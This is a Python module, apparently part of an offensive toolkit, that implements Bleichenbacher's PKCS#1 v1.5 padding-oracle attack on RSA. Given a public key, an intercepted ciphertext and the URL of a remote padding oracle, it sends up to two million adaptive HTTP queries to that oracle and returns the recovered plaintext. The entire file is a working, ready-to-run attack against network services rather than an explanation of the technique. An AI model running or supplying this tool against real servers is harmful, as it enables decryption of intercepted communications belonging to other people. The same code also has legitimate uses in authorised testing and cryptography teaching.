"""Bleichenbacher (B'98) PKCS#1 v1.5 padding-oracle attack.

Given an RSA public key and an oracle that distinguishes valid PKCS#1 v1.5
padding (``0x00 0x02 <non-zero-padding> 0x00 <message>``) from invalid, recover
the plaintext of an intercepted ciphertext. Quadratic in the modulus bit-size
— we cap ``max_queries`` so a misconfigured oracle fails fast instead of
running forever.
"""
from __future__ import annotations

from typing import Any

from ._common import b64d, b64e, build_oracle, safe_result


def _int_from_bytes(b: bytes) -> int:
    return int.from_bytes(b, "big")


def _int_to_bytes(x: int, length: int) -> bytes:
    return x.to_bytes(length, "big")


def _ceildiv(a: int, b: int) -> int:
    return -(-a // b)


def _check_conforming(oracle, c: int, k: int, e: int, n: int) -> bool:
    """Is c·s^e (mod n) PKCS#1-v1.5 conforming?"""
    ct = _int_to_bytes(c % n, k)
    return bool(oracle(ct))


@safe_result
def attack(
    n: int | str,
    e: int,
    ciphertext_b64: str,
    oracle_url: str,
    oracle_success_regex: str | None = None,
    oracle_success_status: int | None = None,
    oracle_method: str = "POST",
    oracle_body_template: str = "{ciphertext_b64}",
    oracle_content_type: str = "application/json",
    max_queries: int = 2_000_000,
    **_: Any,
) -> dict[str, Any]:
    """Bleichenbacher attack. Returns recovered plaintext on success.

    :param n: RSA modulus as int or decimal/hex string.
    :param e: public exponent (typically 65537).
    :param ciphertext_b64: intercepted ciphertext (base64).
    :param oracle_url: URL of the PKCS#1 v1.5 padding oracle.
    """
    if isinstance(n, str):
        n = int(n, 16) if n.lower().startswith("0x") else int(n)
    k = (n.bit_length() + 7) // 8
    B = 1 << (8 * (k - 2))

    ct_bytes = b64d(ciphertext_b64)
    if len(ct_bytes) != k:
        # Left-pad if the caller sent a short ciphertext
        ct_bytes = ct_bytes.rjust(k, b"\x00")
    c0 = _int_from_bytes(ct_bytes)

    oracle = build_oracle(
        url=oracle_url,
        success_regex=oracle_success_regex,
        success_status=oracle_success_status,
        method=oracle_method,
        body_template=oracle_body_template,
        content_type=oracle_content_type,
    )

    # Step 1 — c0 must already be conforming (intercepted ciphertext).
    M = [(2 * B, 3 * B - 1)]
    s = 1
    queries = 0
    iteration = 0

    # Step 2a — find the smallest s >= n/(3B) such that c0·s^e is conforming.
    s = _ceildiv(n, 3 * B)
    while queries < max_queries:
        queries += 1
        if _check_conforming(oracle, (c0 * pow(s, e, n)) % n, k, e, n):
            break
        s += 1
    else:
        return {"ok": False, "reason": f"step 2a exceeded {max_queries} queries"}

    while True:
        iteration += 1
        # Step 3 — narrow M.
        new_M: list[tuple[int, int]] = []
        for a, b in M:
            r_lo = _ceildiv(a * s - 3 * B + 1, n)
            r_hi = (b * s - 2 * B) // n
            for r in range(r_lo, r_hi + 1):
                lo = max(a, _ceildiv(2 * B + r * n, s))
                hi = min(b, (3 * B - 1 + r * n) // s)
                if lo <= hi:
                    # Merge into new_M
                    merged = False
                    for idx, (x, y) in enumerate(new_M):
                        if lo <= y and x <= hi:
                            new_M[idx] = (min(x, lo), max(y, hi))
                            merged = True
                            break
                    if not merged:
                        new_M.append((lo, hi))
        if not new_M:
            return {"ok": False, "reason": "interval set became empty — oracle inconsistency?"}
        M = new_M

        # Step 4 — if only one interval of width 1, we're done.
        if len(M) == 1 and M[0][0] == M[0][1]:
            m = M[0][0]
            pt = _int_to_bytes(m, k)
            # Strip PKCS#1 v1.5 padding: 0x00 0x02 <ps> 0x00 <msg>
            if pt[0:2] == b"\x00\x02":
                zero = pt.find(b"\x00", 2)
                if zero > 0:
                    msg = pt[zero + 1 :]
                    return {
                        "ok": True,
                        "plaintext_b64": b64e(msg),
                        "plaintext_utf8_preview": msg[:200].decode("utf-8", errors="replace"),
                        "queries_used": queries,
                        "iterations": iteration,
                    }
            return {
                "ok": True,
                "plaintext_b64": b64e(pt),
                "queries_used": queries,
                "iterations": iteration,
                "note": "PKCS#1 header not recognised; returning raw integer bytes",
            }

        # Step 2b/2c — find next s.
        if len(M) > 1:
            # 2b: next s > previous s
            s += 1
            while queries < max_queries:
                queries += 1
                if _check_conforming(oracle, (c0 * pow(s, e, n)) % n, k, e, n):
                    break
                s += 1
            else:
                return {"ok": False, "reason": f"step 2b exceeded {max_queries} queries"}
        else:
            # 2c: single-interval narrowing.
            a, b = M[0]
            r = _ceildiv(2 * (b * s - 2 * B), n)
            found = False
            while queries < max_queries and not found:
                s_lo = _ceildiv(2 * B + r * n, b)
                s_hi = (3 * B - 1 + r * n) // a
                s = s_lo
                while s <= s_hi and queries < max_queries:
                    queries += 1
                    if _check_conforming(oracle, (c0 * pow(s, e, n)) % n, k, e, n):
                        found = True
                        break
                    s += 1
                if not found:
                    r += 1
            if not found:
                return {"ok": False, "reason": f"step 2c exceeded {max_queries} queries"}
